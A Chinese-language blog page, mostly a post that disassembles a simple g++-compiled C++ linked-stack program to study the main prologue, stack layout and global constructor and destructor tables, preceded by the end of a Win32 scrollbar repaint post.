iPaintEnd; ++i) &#123;</span><br><span class="line">			</span><br><span class="line">			x = cxChar * (<span class="number">1</span> - iHorzPos);</span><br><span class="line">			y = cyChar * (i - iVertPos);</span><br><span class="line">			TextOut(hdc, x, y, sysmetrics[i].szLabel, lstrlen(sysmetrics[i].szLabel));</span><br><span class="line">			TextOut(hdc, x+<span class="number">22</span>*cxCaps, y, sysmetrics[i].szDesc, lstrlen(sysmetrics[i].szDesc));</span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line">			SetTextAlign(hdc, TA_RIGHT | TA_TOP);</span><br><span class="line">			wsprintf(szBuffer, TEXT(<span class="string">&quot;%5d&quot;</span>), GetSystemMetrics(sysmetrics[i].Index));</span><br><span class="line">			TextOut(hdc, x + <span class="number">22</span> * cxCaps+<span class="number">40</span>*cxChar, y, szBuffer,lstrlen(szBuffer));</span><br><span class="line">			SetTextAlign(hdc, TA_LEFT | TA_TOP);</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">		EndPaint(hwnd, &amp;ps);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">		PostQuitMessage(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> DefWindowProc(hwnd, message, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用老式函数时拖动滑块只有当鼠标松开,才会重绘客户区</p>
<p>现在只要是鼠标拖着竖直滑块有动作,客户区实时更新</p>
<blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220808144125813.png"
alt="image-20220808144125813" />
<figcaption aria-hidden="true">image-20220808144125813</figcaption>
</figure>
<p>绷不住了</p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/07/27/C++%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%9F%BA%E7%A1%80/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/27/C++%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">C++ reverse</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-07-27 21:43:00" itemprop="dateCreated datePublished" datetime="2022-07-27T21:43:00+08:00">2022-07-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-09-11 21:44:54" itemprop="dateModified" datetime="2022-09-11T21:44:54+08:00">2022-09-11</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="c-reverse">C++ reverse</h1>
<h2 id="windows-x86-g编译器生成的代码">windows x86
g++编译器生成的代码</h2>
<p>以链栈类为例观察C++的反汇编长啥样</p>
<h3 id="链栈类图">链栈类图</h3>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220727214639205.png"
alt="image-20220727214639205" />
<figcaption aria-hidden="true">image-20220727214639205</figcaption>
</figure>
<p>mermaid在typora上可以正常显式,但是放到网页上就不知道发生什么事了</p>
<h3 id="代码实现">代码实现</h3>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Stack</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Stack</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        len = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;x)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">pop</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">top</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">length</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> len;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">empty</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> len == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LinkedNode</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="type">int</span> value;</span><br><span class="line">    LinkedNode *next;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">LinkedNode</span>(<span class="type">int</span> v = <span class="number">0</span>, LinkedNode *n = <span class="literal">NULL</span>) : <span class="built_in">value</span>(v), <span class="built_in">next</span>(n) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">setValue</span><span class="params">(<span class="type">int</span> v = <span class="number">0</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        value = v;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getValue</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">setNext</span><span class="params">(LinkedNode *n = <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        next = n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">LinkedNode *<span class="title">getNext</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">friend</span> ostream &amp;<span class="keyword">operator</span>&lt;&lt;(ostream &amp;os, <span class="type">const</span> LinkedNode &amp;node)</span><br><span class="line">    &#123;</span><br><span class="line">        os &lt;&lt; node.value;</span><br><span class="line">        <span class="keyword">return</span> os;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LinkedStack</span> : <span class="keyword">public</span> Stack</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    LinkedNode *head;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">LinkedStack</span>() : <span class="built_in">Stack</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        head = <span class="keyword">new</span> <span class="built_in">LinkedNode</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;x)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        LinkedNode *node = <span class="keyword">new</span> <span class="built_in">LinkedNode</span>(x, head-&gt;<span class="built_in">getNext</span>());</span><br><span class="line">        head-&gt;<span class="built_in">setNext</span>(node);<span class="comment">//头插</span></span><br><span class="line">        ++len;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">pop</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">empty</span>())</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        LinkedNode *p = head-&gt;<span class="built_in">getNext</span>();</span><br><span class="line">        head-&gt;<span class="built_in">setNext</span>(p-&gt;<span class="built_in">getNext</span>());</span><br><span class="line">        <span class="keyword">delete</span> p;</span><br><span class="line">        --len;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">top</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">empty</span>())</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">return</span> head-&gt;<span class="built_in">getNext</span>()-&gt;<span class="built_in">getValue</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LinkedStack sta;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">10</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        sta.<span class="built_in">push</span>(i);<span class="comment">//测试压栈功能</span></span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; sta.<span class="built_in">length</span>() &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">while</span> (!sta.<span class="built_in">empty</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; sta.<span class="built_in">top</span>() &lt;&lt; <span class="string">&quot; &quot;</span>;<span class="comment">//测试取栈顶功能</span></span><br><span class="line">        sta.<span class="built_in">pop</span>();<span class="comment">//测试退栈功能</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="gcc编译链接">GCC编译链接</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ main.cpp -O0 -o main -m32</span><br></pre></td></tr></table></figure>
<h3 id="thiscall调用约定">thiscall调用约定</h3>
<p><strong>thiscall调用约定</strong></p>
<p><strong>唯一一个不能明确指明的函数修饰，因为thiscall不是关键字。他是C++类成员函数缺省的调用约定。由于成员函数调用还是一个this指针，所以thiscall是专为C++设计的调用方式。</strong></p>
<p><strong>1、参数从右往左入栈</strong></p>
<p><strong>2、如果参数个数确定，this指针通过通过ecx传递给被调用者；如果参数个数不确定，this指针在所有参数压栈后被压入堆栈</strong></p>
<p><strong>3、对参数个数不定的，调用者清理堆栈，否则函数自己清理</strong></p>
<h3 id="main函数反汇编">main函数反汇编</h3>
<h4 id="main函数开端">main函数开端</h4>
<p>main遵守cdecl调用约定,只有成员函数才遵守thiscall调用约定</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220428152115878.png"
alt="image-20220428152115878" />
<figcaption aria-hidden="true">image-20220428152115878</figcaption>
</figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.text:00401530 ; Attributes: bp-based frame fuzzy-sp</span><br><span class="line">.text:00401530</span><br><span class="line">.text:00401530 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401530                 public _main</span><br><span class="line">.text:00401530 _main           proc near               ; CODE XREF: ___tmainCRTStartup+221↑p</span><br><span class="line">.text:00401530</span><br><span class="line">.text:00401530 var_14          = dword ptr -14h</span><br><span class="line">.text:00401530 var_10          = byte ptr -10h</span><br><span class="line">.text:00401530 var_4           = dword ptr -4</span><br><span class="line">.text:00401530 argc            = dword ptr  8</span><br><span class="line">.text:00401530 argv            = dword ptr  0Ch</span><br><span class="line">.text:00401530 envp            = dword ptr  10h</span><br><span class="line">.text:00401530</span><br><span class="line">.text:00401530                 lea     ecx, [esp+4]</span><br><span class="line">.text:00401534                 and     esp, 0FFFFFFF0h</span><br><span class="line">.text:00401537                 push    dword ptr [ecx-4]</span><br><span class="line">.text:0040153A                 push    ebp</span><br><span class="line">.text:0040153B                 mov     ebp, esp</span><br><span class="line">.text:0040153D                 push    ecx</span><br><span class="line">.text:0040153E                 sub     esp, 24h</span><br></pre></td></tr></table></figure>
<p>main函数刚开始时,esp指向<code>0077FEDC</code>,用OD观察这个位置,是主线程的堆栈</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220726180155902.png"
alt="image-20220726180155902" />
<figcaption aria-hidden="true">image-20220726180155902</figcaption>
</figure>
<p>主线程的堆栈起于0x77E000,大小是0x2000即8K</p>
<p>由于堆栈倒着生长,因此栈底在0x780000,此时栈顶在0x0077FEDC,方向是0x780000-&gt;0x77E000</p>
<p>距离栈底0x780000-0x77FEDC=0x124即292字节</p>
<p>但是这时候主函数才是刚开始啊,也只有主函数的三个参数压栈了啊,怎么就已经使用了292个字节这么大呢?</p>
<p>主函数不是程序的入口点,在主函数执行前还有其他函数要执行,也可能占用线程栈</p>
<blockquote>
<p>PE头-&gt;NT头-&gt;可选头-&gt;AddressOfEntryPoint</p>
<p>其RVA是0x14C0</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220726170200724.png"
alt="image-20220726170200724" />
<figcaption aria-hidden="true">image-20220726170200724</figcaption>
</figure>
<p>而ImageBase是0x400000</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220726170228334.png"
alt="image-20220726170228334" />
<figcaption aria-hidden="true">image-20220726170228334</figcaption>
</figure>
<p>加起来得到入口点的虚拟地址为<code>0x4014C0</code></p>
</blockquote>
<h5 id="lea-ecx-esp4"><code>lea     ecx, [esp+4]</code></h5>
<p>将要执行此条指令时,esp=0x77FEDC,</p>
<p>此时栈中是啥呢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0077FEDC  00401386  ___tmainCRTStartup+226</span><br><span class="line">0077FEE0  00000001  </span><br><span class="line">0077FEE4  00CA1650  debug034:00CA1650</span><br><span class="line">0077FEE8  00CA22B8  debug034:00CA22B8</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>栈顶<code>0077FEDC</code>存放的是主函数的返回地址,这个地址在<code>___tmainCRTStartu</code>函数中</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:0040136C mov     [esp+90h+lpreserved], eax ; envp</span><br><span class="line">.text:00401370 mov     eax, ds:_argv</span><br><span class="line">.text:00401375 mov     [esp+90h+dwReason], eax ; argv</span><br><span class="line">.text:00401379 mov     eax, ds:_argc</span><br><span class="line">.text:0040137E mov     [esp+90h+dwMilliseconds], eax ; argc</span><br><span class="line">.text:00401381 call    _main</span><br><span class="line">.text:00401386 mov     ecx, ds:_managedapp</span><br></pre></td></tr></table></figure>
<p>显然这个返回地址是<code>call _main</code>函数压入栈中的</p>
</blockquote>
<p>栈顶再往下四个字节,0077FEE0上是1,是main函数的第一个参数<code>int argc</code>,4个字节</p>
<p>再往下四个字节0077FEE4上是main函数的第二个参数,命令行参数字符串数组<code>const char **argv</code>的基地址,4个字节</p>
<p>再往下四个字节0077FEE8上市main函数的第三个参数,环境变量字符串数组<code>const char **envp</code>的基地址,4个字节</p>
<p>esp+4显然就指向main函数的第一个参数<code>int argc</code></p>
<p>加载有效地址将该参数的地址交给ecx</p>
<h5 id="and-esp-0fffffff0h"><code>and     esp, 0FFFFFFF0h</code></h5>
<p>esp低4位置零,高28位保持不变,意思是16字节对齐</p>
<p>此举只能导致esp不增,要么esp本来低位有数现在降到0,要么本来esp就是16字节对齐了,不用降为0.</p>
<p>又栈是倒着生长的,因此不用担心此举将会导致新的压栈覆盖三个参数</p>
<p>对齐的目的应该是追求效率</p>
<p>此步执行后的栈帧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0077FED0  00000002  </span><br><span class="line">0077FED4  00DB1618  debug035:00DB1618</span><br><span class="line">0077FED8  00DB1670  debug035:00DB1670</span><br><span class="line">0077FEDC  00401386  ___tmainCRTStartup+226</span><br></pre></td></tr></table></figure>
<h5
id="push-dword-ptr-ecx-4"><code>push    dword ptr [ecx-4]</code></h5>
<p>ecx在本函数的第一条指令时被置为第一个参数的地址</p>
<p>现在将ecx-4又退到main函数的返回地址</p>
<p>这里又把返回地址压栈</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0077FECC  00401386  ___tmainCRTStarup+226</span><br><span class="line">0077FED0  00000002  </span><br><span class="line">0077FED4  00DA1618  debug035:00DA16</span><br><span class="line">0077FED8  00DA1670  debug035:00DA16</span><br><span class="line">0077FEDC  00401386  ___tmainCRTStarup+226</span><br><span class="line">0077FEE0  00000004  </span><br><span class="line">0077FEE4  00DA1660  debug035:00DA16</span><br><span class="line">0077FEE8  00DA22B8  debug035:00DA22</span><br><span class="line">0077FEEC  00000000  </span><br></pre></td></tr></table></figure>
<p>好像把返回值和参数压了两次栈,第一次是调用者<code>___tmainCRTStarup</code>做的,第二次是main函数做的</p>
<p>为啥要搞重复建设呢?</p>
<p>推测是因为调用约定不同导致的,<code>___tmainCRTStarup</code>这个函数不是<code>cdecl</code>调用约定的,而是<code>stdcall</code>约定的</p>
<h5 id="push-ebp"><code>push    ebp</code></h5>
<p>调用者函数的帧指针ebp压栈保存,方便ebp为现在的函数服务</p>
<h5 id="mov-ebp-esp"><code>mov     ebp, esp</code></h5>
<p>ebp获得当前main函数栈顶指针拷贝</p>
<p>当前栈顶指向二次压栈的返回值地址</p>
<h5 id="push-ecx"><code>push    ecx</code></h5>
<p>ecx存放的是第一个参数的地址,现在又把他压栈,相当于这个值前后一共压栈3次</p>
<p>推测这里是保存ecx寄存器值后来再还给他</p>
<h5 id="sub-esp-24h"><code>sub     esp, 24h</code></h5>
<p>栈顶下移0x24h个字节,为main函数申请栈帧空间,一次性申请全</p>
<p>到此函数开端完毕</p>
<h4 id="main初始化">main初始化</h4>
<h5 id="call-___main"><code>call    ___main</code></h5>
<p>这个函数进行了一些初始化,它先判断是否已经初始化过了,如果初始化过了则返回</p>
<p>否则记录一下已经初始化过了,然后执行<code>___do_global_ctors</code>这个函数,推测是对全局位置的对象实例化调用构造函数</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220726190345716.png"
alt="image-20220726190345716" />
<figcaption aria-hidden="true">image-20220726190345716</figcaption>
</figure>
<p>奇怪的是,调用函数应该使用call指令,但是<code>____main</code>中调用<code>___do_global_ctors</code>使用的是<code>jmp short</code>跳转指令,使用jmp不会参数压栈,可以认为<code>___do_global_ctors</code>不需要参数,但是返回地址也没有压栈,<code>___do_global_ctors</code>执行完毕之后,控制应该交给谁呢?</p>
<p><code>___main</code>函数如果jz跳转实现,再loc_40BC70中也是没有返回值的,但是<code>___main</code>在调用的时候已经把返回到<code>__main</code>的地址压栈,因此可以推测,<code>___do_global_ctors</code>相当于<code>___main</code>的延续,它将会返回到<code>___main</code>栈帧一开始压入的返回地址</p>
<p>这个<code>__do_global_ctors</code>干了啥呢?</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __do_global_ctors()</span><br><span class="line">&#123;</span><br><span class="line">  func_ptr v0; <span class="comment">// ebx</span></span><br><span class="line">  func_ptr v1; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v0 = __CTOR_LIST__[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> ( __CTOR_LIST__[<span class="number">0</span>] == (func_ptr)<span class="number">-1</span> )<span class="comment">//func_ptr是指针类型,(func_ptr)-1是将-1强制转换为指针类型,需要结合 __CTOR_LIST__[0] 来立即这里的判断条件</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v0 = v1;<span class="comment">//v0指向上一个函数指针</span></span><br><span class="line">      v1 = (func_ptr)((<span class="type">char</span> *)v1 + <span class="number">1</span>);<span class="comment">//v1后移一个单位</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( __CTOR_LIST__[(_DWORD)v1] );<span class="comment">//当v1遍历完整个函数指针表时,最后一项为全0,此时while条件不满足,跳出循环</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( ; v0; v0 = (func_ptr)((<span class="type">char</span> *)v0 - <span class="number">1</span>) )<span class="comment">//v0逆序遍历整个函数指针表</span></span><br><span class="line">    __CTOR_LIST__[(_DWORD)v0]();<span class="comment">//后面加了小括号意思是当作函数执行了</span></span><br><span class="line">  atexit(__do_global_dtors);<span class="comment">//注册函数,当程序正常终止的时候,执行__do_global_dtors函数.</span></span><br><span class="line">    <span class="comment">//当程序执行到此时并不会执行执行__do_global_dtors函数,而是当整个exe程序执行完毕才会执行__do_global_dtors函数</span></span><br><span class="line">    <span class="comment">//atexit只是起到注册作用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>__CTOR_LIST__</code>表是一个函数指针表</p>
<p>第零个函数指针<code>__CTOR_LIST__[0]</code>的值为<code>0xFFFFFFFFh=-1</code>,这个值总是-1,表征函数指针表的开始,并且填了第0个元素的空,使得真正的函数指针下标从1开始</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:004CA335 90 90 90 90 90 90 90 90 90 90+                align 10h</span><br><span class="line">.text:004CA340                                               public ___CTOR_LIST__</span><br><span class="line">.text:004CA340                               ; func_ptr __CTOR_LIST__[]</span><br><span class="line">.text:004CA340 FF FF FF FF                   ___CTOR_LIST__  dd 0FFFFFFFFh           ; DATA XREF: ___do_global_ctors+4↑r</span><br><span class="line">.text:004CA340                                                                       ; ___do_global_ctors:loc_40BC18↑r ...</span><br><span class="line">.text:004CA344 3C 16 40 00                                   dd offset __GLOBAL__sub_I_main</span><br><span class="line">.text:004CA348 00 96 4C 00                                   dd offset __GLOBAL__sub_I__ZNSt12ctype_bynameIcEC2ERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEj</span><br><span class="line">.text:004CA34C 90 96 4C 00                                   dd offset __GLOBAL__sub_I__ZNSt12ctype_bynameIwEC2ERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEj</span><br><span class="line">.text:004CA350 60 9D 4C 00                                   dd offset __GLOBAL__sub_I__ZNSt12ctype_bynameIcEC2ERKSsj</span><br><span class="line">.text:004CA354 30 9E 4C 00                                   dd offset __GLOBAL__sub_I__ZNSt12ctype_bynameIwEC2ERKSsj</span><br><span class="line">.text:004CA358 00 9F 4C 00                                   dd offset __GLOBAL__sub_I__ZN9__gnu_cxx9__freeresEv</span><br><span class="line">.text:004CA35C 50 A2 4C 00                                   dd offset __GLOBAL__sub_I__ZSt20__throw_system_errori</span><br><span class="line">.text:004CA360 30 A3 4C 00                                   dd offset _register_frame_ctor</span><br><span class="line">.text:004CA364 00 00 00 00                                   align 8</span><br></pre></td></tr></table></figure>
<p><code>__do_global_dtors</code>干了啥呢?</p>
<p>推测是遍历了析构函数表,挨个执行每个函数指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl __do_global_dtors()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> (*i)(<span class="type">void</span>); <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = *p_63984; i; ++p_63984 )</span><br><span class="line">  &#123;</span><br><span class="line">    i();</span><br><span class="line">    i = p_63984[<span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个<code>p_63984</code>是指向全局析构函数表的指针</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.data:004CD004 6C A3 4C 00                   _p_63984        dd offset dword_4CA36C  ; </span><br></pre></td></tr></table></figure>
<p><code>dword_4CA36C</code>就是<code>__DTOR_LIST_</code>表的基地址</p>
<p>这个表很长,怎么运作的现在不想操心</p>
<p>现在回到main函数中</p>
<h5 id="lea-eax-ebpvar_10"><code>lea     eax, [ebp+var_10]</code></h5>
<p>将栈中var_10的地址放到eax中,这里var_10作用不是狠清晰,前面都没有提到var_10,</p>
